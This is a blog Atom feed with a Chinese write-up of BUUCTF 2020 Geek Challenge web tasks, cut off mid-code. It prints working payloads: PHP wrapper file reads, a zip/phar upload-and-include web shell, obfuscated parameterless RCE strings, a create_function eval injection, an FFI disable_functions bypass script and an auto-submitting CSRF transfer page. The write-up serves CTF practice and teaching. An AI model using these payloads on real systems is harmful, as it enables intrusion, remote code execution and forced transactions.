<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Virtua1</title>
  
  
  <link href="https://v1sun.github.io/atom.xml" rel="self"/>
  
  <link href="https://v1sun.github.io/"/>
  <updated>2021-04-21T12:37:21.472Z</updated>
  <id>https://v1sun.github.io/</id>
  
  <author>
    <name>Virtua1</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BUUCTF-2020极客大挑战</title>
    <link href="https://v1sun.github.io/2021/04/21/BUUCTF-2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
    <id>https://v1sun.github.io/2021/04/21/BUUCTF-2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</id>
    <published>2021-04-21T12:15:00.000Z</published>
    <updated>2021-04-21T12:37:21.472Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BUUCTF-2020极客大挑战"><a href="#BUUCTF-2020极客大挑战" class="headerlink" title="BUUCTF-2020极客大挑战"></a>BUUCTF-2020极客大挑战</h2><h3 id="WEB-Welcome"><a href="#WEB-Welcome" class="headerlink" title="[WEB]Welcome"></a>[WEB]Welcome</h3><p>题目访问不了，bp抓包，响应头显示：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420165004.png" alt="image-20210420165004101"></p><p>改为post请求：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420165110.png" alt="image-20210420165110191"></p><p>数组绕过sha1：<code>roam1[]=1&amp;roam2[]=2</code></p><p>phpinfo()页面搜索flag：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420165752.png" alt="image-20210420165752409"></p><h3 id="WEB-myblog"><a href="#WEB-myblog" class="headerlink" title="[WEB]myblog"></a>[WEB]myblog</h3><p>打开题目看到url，猜测存在伪协议读取文件，没有读到index 读到了login.php：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?page=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=login<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420170555.png" alt="image-20210420170555560"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//secret.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$secret_seed</span> = mt_rand();<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//login.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;secret.php&quot;</span>);<br>mt_srand(<span class="hljs-variable">$secret_seed</span>);<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = mt_rand();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看到传入的username&amp;password进入了<code>/?page=admin/user</code>，读取一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>session_start();<br><span class="hljs-variable">$logined</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&quot;Longlone&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>] == <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&#123;  <span class="hljs-comment">// No one knows my password, including myself</span><br><span class="hljs-variable">$logined</span> = <span class="hljs-literal">true</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;status&#x27;</span>] = <span class="hljs-variable">$logined</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$logined</span> === <span class="hljs-literal">false</span> &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;status&#x27;</span>]) || <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;status&#x27;</span>] !== <span class="hljs-literal">true</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;username or password not correct!&#x27;);window.location.href=&#x27;index.php?page=login&#x27;;&lt;/script&gt;&quot;</span>;<br><span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>通过关键代码可知用户名为<code>Longlone</code>，密码为随机数验证通过会进入admin目录，可见在验证密码的时候采用<code>==</code> ，我们可以通过清空session 然后密码为空绕过：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420185859.png" alt="image-20210420185859172"></p><p>成功登陆。</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420190000.png" alt="image-20210420190000711"></p><p>接下来审计读到的其他代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;Files&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;status&#x27;</span>] === <span class="hljs-literal">true</span>)&#123;<br><span class="hljs-variable">$tmp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;Files&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$tmp_path</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;Files&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-keyword">if</span>((<span class="hljs-variable">$extension</span> = pathinfo(<span class="hljs-variable">$tmp_file</span>)[<span class="hljs-string">&#x27;extension&#x27;</span>]) != <span class="hljs-string">&quot;&quot;</span>)&#123;<br><span class="hljs-variable">$allows</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;jpeg&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>);<br><span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$extension</span>,<span class="hljs-variable">$allows</span>,<span class="hljs-literal">true</span>) <span class="hljs-keyword">and</span> in_array(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;Files&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],array_map(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$ext</span></span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;image/&#x27;</span>.<span class="hljs-variable">$ext</span>;&#125;,<span class="hljs-variable">$allows</span>),<span class="hljs-literal">true</span>))&#123;<br><span class="hljs-variable">$upload_name</span> = sha1(md5(uniqid(microtime(<span class="hljs-literal">true</span>), <span class="hljs-literal">true</span>))).<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$extension</span>;<br>move_uploaded_file(<span class="hljs-variable">$tmp_path</span>,<span class="hljs-string">&quot;assets/img/upload/&quot;</span>.<span class="hljs-variable">$upload_name</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \&#x27;gif\&#x27;, \&#x27;jpeg\&#x27;, \&#x27;jpg\&#x27;, \&#x27;png\&#x27; &#x27;) &lt;/script&gt;&quot;</span>;<br>&#125;<br>&#125;<br>&#125;<br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看到存在这么一段代码，文件上传，采用的是白名单，想到首页的文件包含，我们可以文件包含配合上传图片getshell，但是通过我们伪协议读取源码得知包含的时候会加上<code>.php</code>后缀，因此通过<code>zip://</code> 或者<code>phar://</code>协议来包含。利用过程：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">一句话木马-&gt;压缩为<span class="hljs-function"><span class="hljs-title">zip</span>文件-&gt;</span>修改后缀的<span class="hljs-function"><span class="hljs-title">jpg</span>-&gt;</span>利用<span class="hljs-function"><span class="hljs-title">zip</span>://或者phar://协议包含-&gt;</span>getshell<br></code></pre></td></tr></table></figure><p>先传phpinfo测试，上传后路径：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/assets/img</span><span class="hljs-regexp">/upload/</span>a4c4ab7e86ffb8ae7ebf44a377492d0b073e3b45.jpg<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">page</span>=zip://./assets/img/upload/a<span class="hljs-number">4</span>c<span class="hljs-number">4</span>ab<span class="hljs-number">7</span>e<span class="hljs-number">86</span>ffb<span class="hljs-number">8</span>ae<span class="hljs-number">7</span>ebf<span class="hljs-number">44</span>a<span class="hljs-number">377492</span>d<span class="hljs-number">0</span>b<span class="hljs-number">073</span>e<span class="hljs-number">3</span>b<span class="hljs-number">45</span>.jpg%<span class="hljs-number">231</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420191913.png" alt="image-20210420191850660"></p><p>然后上传一句话木马：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420192239.png" alt="image-20210420192239458"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420192303.png" alt="image-20210420192302961"></p><p>利用phar协议：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">page</span>=phar://./assets/img/upload/<span class="hljs-number">7</span>f<span class="hljs-number">9</span>dd<span class="hljs-number">8</span>cedfae<span class="hljs-number">86</span>b<span class="hljs-number">489906</span>d<span class="hljs-number">5126</span>b<span class="hljs-number">1</span>ccad<span class="hljs-number">949</span>bb<span class="hljs-number">11</span>b.jpg/<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="WEB-rceme"><a href="#WEB-rceme" class="headerlink" title="[WEB]rceme"></a>[WEB]rceme</h3><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420192646.png" alt="image-20210420192645927"></p><p>执行命令前有一个验证，python脚本构造即可。查看源码发现提示 存在swp文件泄露：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420195400.png" alt="image-20210420195400139"></p><p>下载恢复文件：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420195849.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>session_start();<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br><br>        <span class="hljs-keyword">if</span>(substr(md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>) !== <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;code&#x27;</span>])&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(\&#x27;Captcha error~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);<br>        <span class="hljs-variable">$code</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$code</span>) &gt; <span class="hljs-number">70</span> <span class="hljs-keyword">or</span> preg_match(<span class="hljs-string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,<span class="hljs-variable">$code</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(\&#x27;Longlone not like you~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$code</span>))&#123;<br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>                <span class="hljs-keyword">die</span>();<br>        &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>RCE限制长度小于等于70位</p><p>限制特殊符号数字字母，不能用异或和或运算 —可以利用取反</p><p>只允许无参数的函数传递进来，函数名只能为字母—利用无参数RCE</p><p>关于无参数RCE不再详细分析，可参考：<a href="https://xz.aliyun.com/t/9360">https://xz.aliyun.com/t/9360</a></p><p>这里利用<code>getallheaders()</code> 先看一下位置：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">var_dump(getallheaders())<span class="hljs-comment">;</span><br>构造取反后：<br>(~<span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%8</span>D<span class="hljs-variable">%A0</span><span class="hljs-variable">%9</span>B<span class="hljs-variable">%8</span>A<span class="hljs-variable">%92</span><span class="hljs-variable">%8</span>F)((~<span class="hljs-variable">%98</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>E<span class="hljs-variable">%93</span><span class="hljs-variable">%93</span><span class="hljs-variable">%97</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%9</span>E<span class="hljs-variable">%9</span>B<span class="hljs-variable">%9</span>A<span class="hljs-variable">%8</span>D<span class="hljs-variable">%8</span>C)())<span class="hljs-comment">;</span><br>但是本题目需要构造无参数：利用[!<span class="hljs-variable">%FF</span>]或者[!<span class="hljs-variable">%aa</span>]<br>[~<span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%8</span>D<span class="hljs-variable">%A0</span><span class="hljs-variable">%9</span>B<span class="hljs-variable">%8</span>A<span class="hljs-variable">%92</span><span class="hljs-variable">%8</span>F][!<span class="hljs-variable">%FF</span>]([~<span class="hljs-variable">%98</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>E<span class="hljs-variable">%93</span><span class="hljs-variable">%93</span><span class="hljs-variable">%97</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%9</span>E<span class="hljs-variable">%9</span>B<span class="hljs-variable">%9</span>A<span class="hljs-variable">%8</span>D<span class="hljs-variable">%8</span>C][!<span class="hljs-variable">%FF</span>]())<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>注意提交要通过bp 不然会编码：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420204428.png" alt="image-20210420204428016"></p><p>然后构造：<code>system(next(getallheaders()))</code></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">system</span>(next(getallheaders()));<br>(~%8C%86%8C%8B%9A%92)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()))<br><br>[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420205602.png" alt="image-20210420205601739"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420205818.png" alt="image-20210420205818108"></p><h3 id="WEB-FighterFightsInvincibly"><a href="#WEB-FighterFightsInvincibly" class="headerlink" title="[WEB]FighterFightsInvincibly"></a>[WEB]FighterFightsInvincibly</h3><p>直接view-source:</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420211328.png" alt="image-20210420211328195"></p><p>看到是动态代码执行，构造create_function代码注入，看下phpinfo：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">fighter</span>=create_function&amp;fights=&amp;invincibly=<span class="hljs-number">1</span><span class="hljs-comment">;&#125;phpinfo();/*</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420212724.png" alt="image-20210420212724022"></p><p>来个shell吧</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">fighter</span>=create_function&amp;fights=&amp;invincibly=<span class="hljs-number">1</span><span class="hljs-comment">;&#125;eval($_POST[V]);/*</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420212911.png" alt="image-20210420212911179"></p><p>需要bypass，php版本7.4，利用php7.4 FFI实现用PHP代码调用C代码的方式执行命令。</p><p>蚁剑绕过利用失败，采取手动方式：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420222116.png" alt="image-20210420222116841"></p><p>flag读不全。其实还可以采用<a href="https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Bypass%20Disable_functions/">FFI调用PHP源码中的函数</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding:utf-8</span><br><br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://daf3777d-58e5-4447-a849-b1a2ba7c1e9c.node3.buuoj.cn/&quot;</span><br><span class="hljs-comment">#data = &#123;&quot;fighter&quot;: &quot;create_function&quot;, &quot;fights&quot;: &quot;&quot;, &quot;invincibly&quot;: &quot;1;&#125;phpinfo();/*&quot;&#125;</span><br><span class="hljs-comment">#data = &#123;&quot;fighter&quot;: &quot;create_function&quot;, &quot;fights&quot;: &quot;&quot;, &quot;invincibly&quot;: &quot;&quot;&quot;1;&#125;$e=FFI::cdef(&quot;void *popen(char*,char*);\\nvoid pclose(void*);\\nint fgetc(void*);&quot;,&quot;libc.so.6&quot;);$o = $e-&gt;popen(&quot;/readflag&quot;,&quot;r&quot;);$d=&quot;&quot;;while(($c=$e-&gt;fgetc($o))!=-1)&#123;$d.=str_pad(strval(dechex($c)),2,&quot;0&quot;,0);&#125;$e-&gt;pclose($o);echo hex2bin($d);/*&quot;&quot;&quot;&#125;</span><br>data = &#123;<span class="hljs-string">&quot;fighter&quot;</span>: <span class="hljs-string">&quot;create_function&quot;</span>, <span class="hljs-string">&quot;fights&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;invincibly&quot;</span>: <span class="hljs-string">&quot;&quot;&quot;&#125;$e=FFI::cdef(&quot;int php_exec(int type, char *cmd);&quot;);$e-&gt;php_exec(3,$_REQUEST[&#x27;cmd&#x27;]);/*&quot;&quot;&quot;</span>&#125;<br><br>res = requests.post(url, data=data,params=&#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;/readflag&quot;</span>&#125;)<br><span class="hljs-built_in">print</span> (res.content)<br></code></pre></td></tr></table></figure><h3 id="WEB-flagshop"><a href="#WEB-flagshop" class="headerlink" title="[WEB]flagshop"></a>[WEB]flagshop</h3><p>环境不太顺畅..中间重新起了好几次环境。。</p><p>这道题目考察的是CSRF，这种题目并不多，通过这个题目详细分析下这种漏洞。</p><p>先了解一下：<a href="https://segmentfault.com/a/1190000006963312">CSRF 详解与攻防实战</a></p><p>首先进入环境注册登录：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421113917911.png" alt="image-20210421113917911"></p><p>需要足够的钱购买flag。看一下怎么获得足够的钱，发现其有一个转账功能，与上文CSRF讲解的例子不谋而合同样是转账操作，其次还存在一个提交报告的地方，思路很明显了，就是构造恶意的链接，然后在提交报告处提交恶意链接，这样管理员查看报告就会自动转账：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421114229847.png" alt="image-20210421114229847"></p><p>看到Longlone用户，应该是利用CSRF让其给注册的用户转账，利用burp构造CSRF的POC放在vps上：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421114649186.png" alt="image-20210421114649186"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421114910068.png" alt="image-20210421114910068"></p><p>POC修改一下，加一个脚本自动提交的代码，放在vps上index.html，然后提交报告：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">  <span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;postsubmit&quot;</span>).click();&#125;         </span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://31a0d988-edec-4409-83c4-04e3545ef852.node3.buuoj.cn/transfer.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;target&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;111&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;money&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;9999999999999999&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;messages&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;111&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421121648035.png" alt="image-20210421121648035"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421164726997.png" alt="image-20210421164726997"></p><p>提交成功后返回首页查看余额，购买flag即可。</p><h3 id="WEB-greatphp"><a href="#WEB-greatphp" class="headerlink" title="[WEB]greatphp"></a>[WEB]greatphp</h3><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-keyword">$this</span>-&gt;syc != <span class="hljs-keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="hljs-keyword">$this</span>-&gt;syc) === md5(<span class="hljs-keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="hljs-keyword">$this</span>-&gt;syc)=== sha1(<span class="hljs-keyword">$this</span>-&gt;lover)) )&#123;<br>           <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>               <span 